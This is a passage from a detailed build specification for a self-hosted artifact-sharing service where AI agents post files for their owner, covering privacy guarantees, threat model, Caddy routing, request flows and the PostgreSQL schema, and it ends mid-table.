# Share — Complete Build Specification

**A privately hosted place at `share.c52.com` where AI agents post finished artifacts, and their
owner keeps, finds, and hands them out.**

| | |
| --- | --- |
| Document version | 2.0 |
| Date | 24 August 2026 |
| Status | Approved for implementation |
| Audience | Claude Design (Parts 11–13), coding agents (Parts 1–10, 14–16) |
| Prerequisite reading | Part 1 in full, then the part you are implementing |

This document is self-contained. It has no open questions and no `TBD` markers. An implementer
who finds an ambiguity applies §1.9 and records the decision rather than stopping.

**What this is not.** It supersedes an earlier, larger draft of a different product. There is no
Tailscale or private network edge, no website hosting, no embedded data storage for published
pages, no API proxying with injected credentials, no workspaces or roles, no custom domains, no
subdomains, and no user passwords. If a reader has seen the earlier draft, none of that applies.

---

## Contents

1. Overview, Privacy Model, and Glossary
2. Architecture, Deployment, and Request Paths
3. Data Model and Storage
4. Identity: Passkeys, Sessions, Tokens, and Recovery
5. Spaces, Ownership, and the Artifact API
6. The URL Model, Resolution, and Serving
7. Sharing: Links, Passwords, Expiry, and Grants
8. Versions, Trash, Retention, and Search
9. The Agent Surface: MCP and CLI
10. Limits, Audit, and Notifications
11. Every Screen and State
12. All Product Copy
13. Design System: Tokens, Type, Components
14. Test Plan and Acceptance Criteria
15. Installation and Operations
16. Phasing and Definition of Done

Appendix A — Shared inventory: canonical screen and copy numbering

---

# Part 1 — Overview, Privacy Model, and Glossary

## 1.1 What this document is

A complete, implementation-ready specification for **Share**, a privately hosted service where
AI agents post finished artifacts and their owner keeps, finds, and hands them out.

It is written to be handed to two audiences without further human input:

- **Claude Design**, which renders every screen in Part 11 using the design system in Part 13
  and the copy in Part 12.
- **Coding agents**, which implement Parts 2–10 and 15 and verify against Part 14.

There are no open questions and no `TBD` markers. An implementer who finds an ambiguity
applies the resolution rule in §1.9 and records the decision rather than stopping.

### 1.1.1 Fixed names

Unlike the earlier draft, these are decided, not placeholders:

| Thing | Value |
| --- | --- |
| Product name | **Share** |
| Host | `share.c52.com` — one hostname, no subdomains, no second edge |
| CLI binary | `share` |
| Config directory | `~/.share/` |
| System user, database, systemd units | `share`, `share`, `share-api` / `share-worker` |
| Admin tool | `sharectl` |
| API token prefix | `shr_` |

## 1.2 The problem

Agents produce finished things all day — a market report, a posting calendar, a repo diagram, a
dashboard, a summary for a client. Those things are trapped in a chat transcript. Keeping one
means downloading it; a multi-file HTML artifact with styles and images usually breaks when
you do. Sending one means an attachment or a screenshot. A week later nobody remembers which
conversation it was in.

The commercial services that solve this are good and free, and everything sent to them sits on
someone else's disks indefinitely, with file excerpts indexed so their search works. Some of
what these agents produce touches client information. That is the wrong home for it.

## 1.3 Goals

**G1. One call to post.** An agent with a finished artifact posts it and gets back a working
URL, in one operation, with no interactive step.

**G2. Reachable from anywhere.** One public hostname. It works from a laptop on hotel wifi and
from a phone. There is no VPN, no network membership, and no "which URL was it" problem.

**G3. Three honest levels of access.** Signed in only; anyone holding an unguessable link;
that link plus a password. The owner picks per artifact, and the interface makes the choice
plain at the moment of sharing.

**G4. Stable, memorable addresses.** An agent names an artifact `postcal` and it lives at
`share.c52.com/postcal` — typed, bookmarked, linked from other artifacts, updated in place
week after week without the URL changing.

**G5. Agent-native, MCP first.** A remote MCP endpoint and an HTTP API of equal capability,
plus a CLI that can do everything either can. Nothing to install to get started.

**G6. Safe for agents to have full control.** Agents may overwrite and delete their own work.
That is only acceptable because overwrites keep versions and deletes go to a trash that can be
restored from.

**G7. Operable by one person.** One modest server, one database, files on local disk, one
backup job. No object storage, no queue broker beyond Redis, no orchestrator.

**G8. It never reads your files.** Not for titles, not for search, not for anything.

## 1.4 Non-goals

**N1. It is not a website host.** Share serves static artifacts. No server-side code, no
databases for published pages, no build steps, no application runtime. This line is what keeps
the system small enough for one person to hold in their head.

**N2. No embedded data storage or API proxying.** An earlier draft of this design let published
pages store records and call upstream APIs with server-injected credentials. Both are cut. They
were the largest source of security surface in the system and they serve a use case — building
applications — that N1 already excludes.

**N3. No teams, roles, or permission matrices.** An account is a person with a space. Sharing
is per-artifact. There is no owner/admin/member hierarchy, no invitations with roles, no
workspace.

**N4. No public sign-up.** Accounts exist because the operator created them.

**N5. No high availability.** One server. Restarts interrupt in-flight uploads. Acceptable.

**N6. No full-text search inside artifacts.** Deliberate, per G8 and P5.

**N7. No content moderation pipeline.** The operator and their invited users are the only
publishers.

## 1.5 Who uses it

| Persona | Credential | Can do |
| --- | --- | --- |
| **Owner** | Passkey | Everything. Holds the root namespace. Creates accounts. |
| **Agent** | API token `shr_…` | Full CRUD inside its owner's space. Cannot create share links unless its token carries `share:create`. |
| **User** | Passkey | Same as the owner, inside their own `~name` space. Sees their own artifacts plus what has been shared with them. |
| **Recipient** | A link, and possibly its password | Views one artifact. No account, nothing to install. |

There is no anonymous *post*. Every write carries a token or a session, and every token belongs
to an identity. This is the single non-negotiable divergence from the commercial reference: an
unauthenticated publish endpoint is an unlogged way for anything with shell access to move data
out of the perimeter.

## 1.6 Privacy and threat model

### 1.6.1 Where the wall is, and what that costs

The wall is **identity and capability**, not network position. Everything lives on a public
hostname; a sign-in or an unguessable link decides what a visitor sees.

An earlier draft put the wall at the network — artifacts were unroutable from the internet
unless deliberately exposed. That is a stronger property, and it was rejected for a good
reason: it made the owner's own access painful away from home, which is the opposite of the
point. The tradeoff is stated here rather than buried: **there is now a door facing the street,
and authentication is what holds it shut.**

Three things make that acceptable:

1. The door is the only thing on that surface. Share runs no user code, has no published-page
   database, and makes no outbound requests on behalf of published content. The attack surface
   is a static file server, a login, and a token check.
2. Passkeys (§4) remove the entire password-guessing and password-reset attack class.
3. Unguessable links carry 128 bits of entropy and always expire.

### 1.6.2 Adversaries considered

**A1. The internet at large.** Scans for artifacts, guesses names and share links, probes for
traversal. Mitigations: signed-in-only is the default; share tokens are 128-bit; there is no
listing, directory, or enumeration anywhere; strict path normalisation (§6.4); every artifact
served `noindex` with a deny-all `robots.txt`.

**A2. A holder of one share link.** Tries to reach other artifacts, the owner's namespace, or
the API. Mitigations: a share token authorises exactly one artifact and reveals neither owner
nor artifact name until used; share sessions never authorise the API or the dashboard (§4.7).

**A3. A compromised or looping agent.** Holds a valid token and shell access. This is the
adversary the product is shaped around. Mitigations: tokens are per-agent, named, scoped, and
individually revocable; `share:create` is a separate scope not granted by default; every post,
overwrite, delete, and share is audit-logged with token ID and source IP; deletes go to trash;
overwrites keep versions; anomaly thresholds notify the owner (§10.4).

**A4. Another user on the instance.** Mitigations: spaces are hard boundaries. There is no API
by which any principal writes into a space it does not own (§5.2). Reading requires an explicit
per-artifact share.

**A5. The hosting provider.** Has disk access. Mitigations: full-disk encryption (§15.1) and
encrypted off-host backups. Artifact bytes are not application-layer encrypted — they must be
servable — and this is a stated residual risk.

### 1.6.3 Guarantees

Each has a test in Part 14.

| ID | Guarantee | Test |
| --- | --- | --- |
| **P1** | An artifact with no share link and no signed-in session returns the same `404` as a name that does not exist — same body, same headers, no measurable timing difference. | T-PRIV-01 |
| **P2** | No artifact can be created, updated, or deleted without a token or a session. | T-PRIV-02 |
| **P3** | Creating, extending, or revoking a share link writes an audit record with actor, token ID, source IP, artifact, expiry, and whether a password was set. | T-PRIV-03 |
| **P4** | Every share link has a non-null expiry. There is no permanent share link. | T-PRIV-04 |
| **P5** | Artifact contents are never read for indexing, summarising, embedding, titling, or classification. Titles come from the poster or do not exist. | T-PRIV-05 |
| **P6** | Full IP addresses are never persisted. View records store a salted daily hash that cannot be recomputed the next day. | T-PRIV-06 |
| **P7** | No principal can read, write, list, or enumerate any artifact in a space it does not own, except through a share link explicitly granted to it. | T-PRIV-07 |
| **P8** | Deleting an artifact and emptying the trash removes its rows and dereferences its files; the next collection pass removes bytes no surviving version references. | T-PRIV-08 |
| **P9** | Revoking a share link, changing its password, or deleting the artifact invalidates every existing recipient session for it on the next request. | T-PRIV-09 |

### 1.6.4 Residual risks, stated

- Artifact bytes sit unencrypted on disk so they can be served. Disk encryption is the only
  defence against physical or provider access.
- A share link is a bearer credential. It does not get guessed; it gets forwarded, saved,
  screenshotted, and archived. **Expiry is the control**, which is why P4 has no exception.
- Losing every registered passkey and the recovery code means the only way back in is
  server-side (§4.5). That is a real recovery burden accepted in exchange for deleting the
  password-reset attack class.
- A single server holds everything. Backups are encrypted; the live system is not.

## 1.7 Principles

1. **Signed-in is the default.** Anything that widens access is an explicit act with an end
   date and an audit record.
2. **Sharing is an object, not a setting.** A share link is a thing you create, list, and
   revoke — never a checkbox toggled in passing.
3. **The agent path and the human path are the same API.** The dashboard calls what the MCP
   server calls.
4. **Nothing is inferred from content.**
5. **Destructive actions are reversible.** Overwrite keeps versions; delete goes to trash.
6. **Failures are specific.** Every error carries a stable code and a sentence an agent can act
   on.
7. **Files are stored once.** Identical bytes are shared across versions, artifacts, and users,
   so history and copies are nearly free.

## 1.8 The whole product in twelve lines

```
agent → post artifact "postcal" (4 files)
      ← https://share.c52.com/postcal          signed-in only

owner → open it, from anywhere, one passkey tap

agent → post "postcal" again next week
      ← same URL, version 2, version 1 retained

owner → create share link, 14 days, with password
      ← https://share.c52.com/s/9fq2n4kw…      password: civil-marmot-71
                                                expires 2026-09-07 18:04 UTC
```

## 1.9 Ambiguity resolution rule

If this document is silent or self-contradictory:

1. Prefer the interpretation that exposes less.
2. Prefer the interpretation that matches an existing pattern in this spec.
3. Prefer the interpretation that adds no configuration surface.
4. Record it in `DECISIONS.md` at the repo root with the section number and the choice. Do not
   stop and ask.

## 1.10 Glossary

| Term | Meaning |
| --- | --- |
| **Artifact** | One published thing: a single file or a bundle of files that belong together. The unit of ownership, addressing, sharing, versioning, and deletion. |
| **Bundle** | An artifact with more than one file — an HTML page plus its styles, images, and fonts. Served as a unit with relative links intact. |
| **File** | An immutable blob of bytes, stored once instance-wide, addressed by its SHA-256. |
| **Name** | The artifact's address within its space: `postcal`, `q3/market-report`. Chosen, memorable, stable. |
| **Space** | One user's namespace. `~sarah` for a user, the bare root for the owner. A hard boundary: nothing writes across it. |
| **Version** | An immutable snapshot of an artifact's files. Overwriting creates one; earlier ones remain. |
| **Share link** | A capability URL at `/s/{token}` granting view access to exactly one artifact, always expiring, optionally password-protected. |
| **Recipient** | Someone viewing through a share link. No account. |
| **Token** | An agent's credential, `shr_…`, scoped and revocable. |
| **Passkey** | A human's credential. WebAuthn. No password exists anywhere in the system. |
| **Trash** | Where deleted artifacts wait 30 days before real deletion. |

## 1.11 Document map

| Part | Contents | Audience |
| --- | --- | --- |
| 1 | Overview, privacy model, glossary | Everyone |
| 2 | Architecture, deployment, request paths | Backend, ops |
| 3 | Data model and storage | Backend |
| 4 | Identity: passkeys, sessions, tokens, recovery | Backend, frontend |
| 5 | Spaces, ownership, and the artifact API | Backend, agents |
| 6 | URL model, resolution, and serving | Backend |
| 7 | Sharing: links, passwords, expiry, copies | Backend, frontend |
| 8 | Versions, trash, retention, and search | Backend |
| 9 | Agent surface: MCP and CLI | Agents |
| 10 | Limits, audit, notifications | Backend, ops |
| 11 | Every screen and state | **Claude Design**, frontend |
| 12 | All product copy | **Claude Design**, frontend |
| 13 | Design system | **Claude Design**, frontend |
| 14 | Test plan and acceptance criteria | All |
| 15 | Install and operations | Ops |
| 16 | Phasing and definition of done | Everyone |

---

# Part 2 — Architecture, Deployment, and Request Paths

## 2.1 Components

One Linode VM, systemd units on the host, no containers — so `sendfile` works straight from the
file store and there is one place to look when something breaks.

| Component | Software | Listens | Purpose |
| --- | --- | --- | --- |
| **Edge** | Caddy 2.8+ with a DNS provider module | `:80`, `:443` | TLS, routing, authorisation callback, static file serving |
| **API** | FastAPI on Uvicorn, 4 workers under Gunicorn | UNIX socket `/run/share/api.sock` | Everything dynamic: auth, artifact CRUD, MCP, authorisation decisions |
| **Worker** | Same codebase, `share-worker` entrypoint | — | Trash emptying, expiry sweeps, file collection, mail, view rollups, backups |
| **Database** | PostgreSQL 16 | `127.0.0.1:5432` | All metadata, audit log, view counts |
| **Cache** | Redis 7 | `127.0.0.1:6379` | Rate limits, resolution cache, upload sessions, view buffer |
| **File store** | Local filesystem | `/var/lib/share/files` | Content-addressed artifact bytes |
| **Mail** | SMTP relay | outbound `:587` | Invitations, expiry notices, operator alerts |

**Sizing.** Linode 4 GB Shared (2 vCPU, 4 GB, 80 GB SSD) is the floor. Artifact storage is the
growth axis, so `/var/lib/share` is a separate Block Storage volume that can be grown without
resizing the instance.

Compared to the earlier two-edge design this removes: a second bind address, a second wildcard
certificate, split-horizon DNS, Tailscale as a dependency of the web tier, the entire
edge-identification header path, and the class of bug where a client claims to be on the
private network.

## 2.2 Topology

```
                ┌────────────────────── Linode VM (share-01) ──────────────────────┐
                │                                                                  │
 internet ──────┼──▶ :443 ┌────────┐  forward_auth  ┌────────────┐  asyncpg ┌─────┐│
 share.c52.com  │         │ Caddy  │ ─────────────▶ │            │ ───────▶ │  PG ││
                │         │        │ ◀───────────── │  FastAPI   │          └─────┘│
                │         │        │  X-Share-File  │            │ ───────▶ ┌─────┐│
                │         └───┬────┘                └─────┬──────┘          │Redis││
                │             │ file_server               │                 └─────┘│
                │             ▼                           ▼                        │
                │   /var/lib/share/files ◀────── writes, collection                │
                │                                                                  │
                │  systemd: share-api, share-worker, caddy, postgresql, redis       │
                └──────────────────────────────────────────────────────────────────┘
```

## 2.3 DNS and TLS

| Name | Type | Value |
| --- | --- | --- |
| `share` | `A` | Linode public IPv4 |
| `share` | `AAAA` | Linode public IPv6 |

That is the entire DNS requirement. One hostname, no wildcard, so the certificate comes from a
plain HTTP-01 challenge and needs no DNS API token at all — one fewer credential to hold and
rotate than the earlier design.

TTL 300 during rollout, 3600 once stable.

## 2.4 Caddyfile

The authoritative routing contract.

```caddyfile
{
    email ops@c52.com
    servers {
        # Only loopback is a trusted proxy. Never `private_ranges`.
        trusted_proxies static 127.0.0.1/32 ::1/128
    }
}

share.c52.com {
    encode zstd gzip

    # Strip every internal header a client might try to forge, not a chosen few.
    request_header -X-Share-*

    # ── Dynamic surfaces go straight to the API ──────────────────────────
    handle /~/*        { reverse_proxy unix//run/share/api.sock }   # dashboard
    handle /api/*      { reverse_proxy unix//run/share/api.sock }   # HTTP API
    handle /mcp        { reverse_proxy unix//run/share/api.sock }   # remote MCP
    handle /mcp/*      { reverse_proxy unix//run/share/api.sock }
    handle /auth/*     { reverse_proxy unix//run/share/api.sock }   # passkey ceremonies
    handle /s/*        { reverse_proxy unix//run/share/api.sock }   # share-link entry
    handle /robots.txt { reverse_proxy unix//run/share/api.sock }

    # ── Everything else is an artifact path ──────────────────────────────
    handle {
        forward_auth unix//run/share/api.sock {
            uri /internal/authorize
            copy_headers X-Share-File X-Share-Content-Type X-Share-Cache-Control \
                         X-Share-Disposition X-Share-CSP X-Share-Frame-Options \
                         X-Share-Artifact X-Share-Version
        }

        header Content-Type            {http.request.header.X-Share-Content-Type}
        header Cache-Control           {http.request.header.X-Share-Cache-Control}
        header Content-Disposition     {http.request.header.X-Share-Disposition}
        header Content-Security-Policy {http.request.header.X-Share-CSP}
        header X-Frame-Options         {http.request.header.X-Share-Frame-Options}
        header X-Content-Type-Options  nosniff
        header Referrer-Policy         strict-origin-when-cross-origin
        header X-Robots-Tag            "noindex, nofollow"
        header Permissions-Policy      "interest-cohort=()"
        header -Server

        rewrite * {http.request.header.X-Share-File}
        root * /var/lib/share/files
        file_server { precompressed br gzip }
    }
}
```

Two things to note. The constant security headers are set **here**, not in the API, because
`file_server` answers without returning through the API — a header the API sets on the
`forward_auth` response reaches Caddy, not the visitor, unless it is in `copy_headers` and
re-emitted. And `X-Robots-Tag: noindex, nofollow` is unconditional: nothing served by Share is
ever meant to be indexed.

### 2.4.1 The `forward_auth` contract

`GET|HEAD /internal/authorize` runs for every artifact request. Target: under 15 ms at p99 on a
warm cache.

| Response | Meaning | Caddy does |
| --- | --- | --- |
| `200` + `X-Share-File: ab/cd/abcd…` | Authorised | `file_server` serves the blob |
| `404` | No such artifact, no access, expired, or missing path | Body proxied — the not-found page |
| `429` | Rate limited | Body proxied |
| `503` | API unhealthy | Caddy serves a static maintenance page |

`/internal/authorize` returns only those four statuses. It never returns `401`: a password gate
on a root-space path would tell a stranger that the artifact exists, which violates P1. Gates
live exclusively under `/s/*`, which the API serves directly.

Optional response headers: `X-Share-Content-Type` (authoritative over sniffing),
`X-Share-Cache-Control`, `X-Share-Disposition`, `X-Share-CSP` (set for SVG, §6.6),
`X-Share-Frame-Options`, plus `X-Share-Artifact` / `X-Share-Version` for logging. An empty
value makes Caddy omit the header.

### 2.4.2 Caching

| Redis key | Holds | TTL |
| --- | --- | --- |
| `sh:res:{space}:{name}` | Resolved artifact + live version ID | 60 s, deleted on write |
| `sh:man:{versionId}` | path → `sha256:contentType:size` | 600 s, immutable |
| `sh:tok:{sha256}` | Share-token validity and its artifact | 300 s, deleted on revoke |
| `sh:sess:{sha256}` | Session validity | 300 s, deleted on sign-out |

Cold path is two indexed queries. Warm path is one `HGET`. Revocation always bypasses the
cache with an explicit `DEL` — a stale window on any other field is fine, a stale window on
revocation is not.

## 2.5 Request paths, traced

### 2.5.1 Owner opens their own artifact

```
GET https://share.c52.com/postcal/style.css      Cookie: share_s=…
 → Caddy strips X-Share-*, calls /internal/authorize
     resolve "" (root space) + "postcal"           → artifact
     session valid, user owns the space            → allow
     manifest lookup "/style.css"                  → sha 1b70…, text/css
   ← 200  X-Share-File: 1b/70/1b70…
          X-Share-Content-Type: text/css
          X-Share-Cache-Control: private, max-age=300
 → file_server, sendfile
```

### 2.5.2 A recipient opens a share link, first visit

```
GET https://share.c52.com/s/9fq2n4kw…
 → /s/* is dynamic → API
     token valid, not expired, artifact alive
     link has a password, no share_r_… cookie
   ← 401, password gate page (§12.7), Set-Cookie: share_c=<challenge>

POST https://share.c52.com/s/9fq2n4kw…/unlock     (form-encoded, works without JS)
   ← 303 → /s/9fq2n4kw…/
     Set-Cookie: share_r_<tokenSuffix>=<signed>; HttpOnly; Secure; SameSite=Lax;
                 Path=/s/9fq2n4kw…; Max-Age=86400
```

Subsequent asset requests stay under `/s/{token}/…`, so relative links inside a bundle resolve
without the recipient ever learning the artifact's real name or owner.

### 2.5.3 An artifact that exists, requested by a stranger

```
GET https://share.c52.com/postcal
 → no session, no share token
   ← 404, byte-identical to a name that was never used  (P1)
```

### 2.5.4 An agent posts

```
POST https://share.c52.com/api/v1/artifacts     Authorization: Bearer shr_…
   ← 201 { uploads: [signed PUT URLs for the 2 files we don't already hold], skipped: 2 }
PUT  https://share.c52.com/api/v1/files/{sha256}?…
POST https://share.c52.com/api/v1/artifacts/postcal/versions/{id}/commit
   ← 200 { url: "https://share.c52.com/postcal", version: 2 }
```

## 2.6 Processes and scheduled work

| Unit | Command | Restart |
| --- | --- | --- |
| `share-api.service` | `gunicorn -k uvicorn.workers.UvicornWorker -w 4 -b unix:/run/share/api.sock share.api:app` | always |
| `share-worker.service` | `python -m share.worker` | always |

Worker schedule, UTC, ±60 s jitter:

| Job | Cadence | Section |
| --- | --- | --- |
| View buffer flush | 60 s | §10.6 |
| Share-link expiry sweep | 5 min | §7.5 |
| Artifact TTL sweep | 15 min | §8.5 |
| Abandoned upload-session cleanup | 15 min | §5.7 |
| Expiry warning mail (T−24 h) | hourly :20 | §12.9 |
| Trash emptying (>30 days) | daily 03:30 | §8.4 |
| File collection (mark and sweep) | daily 04:00 | §3.6 |
| Version pruning | daily 04:15 | §8.3 |
| Staleness recompute | daily 05:00 | §8.6 |
| Backup | daily 02:00 | §15.4 |

## 2.7 Configuration

Environment variables read into a Pydantic `Settings` object at startup. Secrets arrive by
systemd `LoadCredential`, never in the environment.

| Variable | Required | Default | Meaning |
| --- | --- | --- | --- |
| `SHARE_HOST` | yes | — | `share.c52.com`. Also the WebAuthn Relying Party ID |
| `SHARE_DATABASE_URL` | yes | — | `postgresql+asyncpg://share@/share?host=/var/run/postgresql` |
| `SHARE_REDIS_URL` | no | `redis://127.0.0.1:6379/0` | |
| `SHARE_FILE_ROOT` | yes | `/var/lib/share/files` | |
| `SHARE_TMP_ROOT` | yes | `/var/lib/share/tmp` | Must be the same filesystem as the file root |
| `SHARE_SMTP_URL` | yes | — | |
| `SHARE_MAIL_FROM` | yes | — | |
| `SHARE_DEFAULT_SHARE_TTL` | no | `14d` | |
| `SHARE_MAX_SHARE_TTL` | no | `180d` | |
| `SHARE_TRASH_DAYS` | no | `30` | |
| `SHARE_MAX_ARTIFACT_BYTES` | no | `10737418240` (10 GB) | Generous by decision — video is in scope |
| `SHARE_MAX_FILE_BYTES` | no | `5368709120` (5 GB) | |
| `SHARE_MAX_FILES_PER_VERSION` | no | `5000` | |
| `SHARE_USER_QUOTA_BYTES` | no | `536870912000` (500 GB) | |
| `SHARE_LOG_LEVEL` | no | `INFO` | |
| **Credentials** | | | |
| `secret_key` | yes | — | 32 bytes; signs cookies and upload URLs |
| `view_salt` | yes | — | 32 bytes; daily viewer hashing |
| `smtp_password` | yes | — | |

Startup verifies: file root writable, tmp root on the same device as the file root, Postgres
reachable at the expected migration revision, Redis reachable, `SHARE_HOST` resolvable. Any
failure exits non-zero with one diagnostic line.

**No permanent-share-link setting exists.** P4 has no configuration escape hatch, deliberately.

## 2.8 Health

| Endpoint | Auth | Returns |
| --- | --- | --- |
| `GET /internal/health` | loopback | `200` if the process is alive |
| `GET /internal/ready` | loopback | `200` if Postgres, Redis, file root, and migration revision all check out; `503` with a `checks` object otherwise |
| `GET /api/v1/status` | session or token | Version, uptime, disk free, quota use, queue depths, last backup |

## 2.9 Host security

- The `share` user owns `/var/lib/share`; `caddy` reads the file root through a shared group.
  Nothing else touches it.
- Postgres and Redis bind loopback only; Redis requires a password and has
  `rename-command CONFIG ""`.
- UFW: inbound `22`, `80`, `443`. SSH on `22` restricted by key and, if the operator keeps
  Tailscale on the box for administration, by source address. **Share itself knows nothing
  about Tailscale** — that is now purely an ops choice about how the operator reaches the
  machine.
- Automatic security updates on; Caddy and Postgres pinned to major versions.
- Outbound network is unrestricted for mail and ACME only. Share makes no outbound request on
  behalf of published content — there is no proxying feature, so there is no SSRF surface at
  all. This is the single largest security simplification versus the earlier draft.

---

# Part 3 — Data Model and Storage

## 3.1 Conventions

- PostgreSQL 16. Timestamps are `timestamptz`, stored UTC.
- Primary keys are prefixed ULIDs: `{prefix}_{26-char Crockford base32}`. They sort by creation
  time, so `ORDER BY id` is a valid cheap ordering and cursor pagination is trivial.
- Soft deletes use `trashed_at` (recoverable, §8.4) or `deleted_at` (gone at the next
  collection). Every read filters both unless explicitly listing trash.
- Sizes are `bigint` bytes. No floats.
- JSONB only for genuinely schemaless payloads (audit metadata, user settings).
- Alembic migrations; the initial one creates tables in dependency order and adds the two
  forward-referencing foreign keys (`artifact.live_version_id`, `artifact_version.artifact_id`)
  afterwards.
- `CREATE EXTENSION citext;` and `CREATE EXTENSION pg_trgm;` in the first migration — the
  latter powers name and title search (§8.7).

### 3.1.1 ID prefixes

| Prefix | Entity | Prefix | Entity |
| --- | --- | --- | --- |
| `usr_` | user | `art_` | artifact |
| `pky_` | passkey credential | `ver_` | artifact version |
| `ses_` | session | `ups_` | upload session |
| `shr_` | API token (also the token prefix) | `lnk_` | share link |
| `inv_` | invite | `grn_` | share grant (to a user) |
| `rcp_` | recipient session | `aud_` | audit event |

## 3.2 Entity overview

```
app_user ──< passkey_credential
         ──< recovery_code
         ──< session
         ──< api_token
         ──< artifact ──< artifact_version ──< version_file >── file
         │           ├──< share_link ──< recipient_session
         │           ├──< share_grant >── app_user   ("shared with me")
         │           └──< artifact_tag
         └──< audit_event
```

## 3.3 Users and credentials

```sql
CREATE TABLE app_user (
    id              text PRIMARY KEY,
    email           citext NOT NULL UNIQUE,
    display_name    text,
    handle          citext UNIQUE,          -- namespace label; NULL only for the root user
    is_root         boolean NOT NULL DEFAULT false,  -- holds the bare root namespace
    quota_bytes     bigint NOT NULL DEFAULT 536870912000,
    storage_bytes   bigint NOT NULL DEFAULT 0,
    artifact_count  integer NOT NULL DEFAULT 0,
    settings        jsonb NOT NULL DEFAULT '{}'::jsonb,
    created_at      timestamptz NOT NULL DEFAULT now(),
    last_seen_at    timestamptz,
    disabled_at     timestamptz,
    CONSTRAINT handle_format CHECK (
        handle IS NULL OR handle ~ '^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$')
);
-- Exactly one root user.
CREATE UNIQUE INDEX one_root_user ON app_user ((true)) WHERE is_root;
```

The root user still has a handle. Their artifacts are reachable at both `/name` and
`/~handle/name` (§6.2), so promoting or demoting the root flag never breaks a link — the
canonical form always exists.

```sql
CREATE TABLE passkey_credential (
    id              text PRIMARY KEY,
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    credential_id   bytea NOT NULL UNIQUE,   -- raw WebAuthn credential ID
    public_key      bytea NOT NULL,          -- COSE key
    sign_count      bigint NOT NULL DEFAULT 0,
    transports      text[] NOT NULL DEFAULT '{}',
    aaguid          uuid,
    backup_eligible boolean NOT NULL DEFAULT false,
    backup_state    boolean NOT NULL DEFAULT false,
    name            text NOT NULL,           -- "1Password", "MacBook Touch ID"
    created_at      timestamptz NOT NULL DEFAULT now(),
    last_used_at    timestamptz,
    revoked_at      timestamptz
);
CREATE INDEX ON passkey_credential (user_id) WHERE revoked_at IS NULL;

CREATE TABLE recovery_code (
    id              text PRIMARY KEY,
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    code_hash       bytea NOT NULL,          -- argon2id: this one IS low-entropy-ish and typed
    created_at      timestamptz NOT NULL DEFAULT now(),
    used_at         timestamptz,
    used_ip         inet
);
CREATE INDEX ON recovery_code (user_id) WHERE used_at IS NULL;

CREATE TABLE session (
    id              text PRIMARY KEY,
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    token_hash      bytea NOT NULL UNIQUE,
    passkey_id      text REFERENCES passkey_credential(id),  -- which key signed in
    created_at      timestamptz NOT NULL DEFAULT now(),
    last_seen_at    timestamptz NOT NULL DEFAULT now(),
    expires_at      timestamptz NOT NULL,
    ip              inet,
    user_agent      text,
    revoked_at      timestamptz
);
CREATE INDEX ON session (user_id) WHERE revoked_at IS NULL;

CREATE TABLE api_token (
    id              text PRIMARY KEY,        -- shr_...
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    name            text NOT NULL,           -- "claude-code@hosta"
    display_prefix  text NOT NULL,           -- first 12 chars, shown in the UI
    token_hash      bytea NOT NULL UNIQUE,   -- sha256; tokens are 256-bit random
    scopes          text[] NOT NULL,
    created_at      timestamptz NOT NULL DEFAULT now(),
    last_used_at    timestamptz,
    last_used_ip    inet,
    expires_at      timestamptz,
    revoked_at      timestamptz
);
CREATE INDEX ON api_token (user_id) WHERE revoked_at IS NULL;

CREATE TABLE invite (
    id              text PRIMARY KEY,
    email           citext NOT NULL,
    handle          citext NOT NULL,         -- the namespace they will get
    token_hash      bytea NOT NULL,
    invited_by      text NOT NULL REFERENCES app_user(id),
    expires_at      timestamptz NOT NULL,
    accepted_at     timestamptz,
    revoked_at      timestamptz,
    created_at      timestamptz NOT NULL DEFAULT now()
);
CREATE UNIQUE INDEX ON invite (email) WHERE accepted_at IS NULL AND revoked_at IS NULL;
```

WebAuthn challenges are **not** stored in Postgres — they live in Redis at
`sh:wa:{challengeId}` with a 300-second TTL, because they are single-use and worthless
afterwards.

## 3.4 Artifacts, versions, files

```sql
CREATE TYPE artifact_kind AS ENUM ('bundle', 'page', 'document', 'image', 'video', 'file');

CREATE TABLE artifact (
    id              text PRIMARY KEY,
    user_id         text NOT NULL REFERENCES app_user(id) ON DELETE CASCADE,
    name            text NOT NULL,           -- 'postcal', 'q3/market-report'
    title           text,                    -- explicit only, never inferred (P5)
    description     text,
    kind            artifact_kind NOT NULL,
    live_version_id text,                    -- FK added after artifact_version exists
    entry_path      text,                    -- '/index.html' for bundles, '/report.pdf' for a single file
    ttl_expires_at  timestamptz,             -- NULL = keeps until deleted
    pinned          boolean NOT NULL DEFAULT false,
    view_count      integer NOT NULL DEFAULT 0,
    last_viewed_at  timestamptz,
    created_by_token text REFERENCES api_token(id),
    copied_from     text REFERENCES artifact(id),   -- 'save a copy' provenance
    created_at      timestamptz NOT NULL DEFAULT now(),
    updated_at      timestamptz NOT NULL DEFAULT now(),
    trashed_at      timestamptz,
    deleted_at      timestamptz,
    CONSTRAINT name_format CHECK (
        name ~ '^[a-z0-9][a-z0-9._-]*(/[a-z0-9][a-z0-9._-]*)*$' AND length(name) <= 200)
);
CREATE UNIQUE INDEX ON artifact (user_id, name) WHERE deleted_at IS NULL;
CREATE INDEX ON artifact (user_id, updated_at DESC) WHERE trashed_at IS NULL AND deleted_at IS NULL;
CREATE INDEX ON artifact (trashed_at) WHERE trashed_at IS NOT NULL;
CREATE INDEX ON artifact (ttl_expires_at) WHERE ttl_expires_at IS NOT NULL AND trashed_at IS NULL;
CREATE INDEX artifact_name_trgm ON artifact USING gin (name gin_trgm_ops);
CREATE INDEX artifact_title_trgm ON artifact USING gin (title gin_trgm_ops);

CREATE TABLE artifact_version (
    id              text PRIMARY KEY,
    artifact_id     text NOT NULL REFERENCES artifact(id) ON DELETE CASCADE,
    seq             integer NOT NULL,        -- 1, 2, 3… human-facing version number
    file_count      integer NOT NULL,
    total_bytes     bigint NOT NULL,
    entry_path      text,
    note            text,
    created_by_token text REFERENCES api_token(id),
    created_by_user  text REFERENCES app_user(id),
    created_at      timestamptz NOT NULL DEFAULT now(),
    deleted_at      timestamptz,
    UNIQUE (artifact_id, seq)
);
CREATE INDEX ON artifact_version (artifact_id, seq DESC) WHERE deleted_at IS NULL;

CREATE TABLE version_file (
    version_id      text NOT NULL REFERENCES artifact_version(id) ON DELETE CASCADE,
    path            text NOT NULL,           -- normalised, leading slash
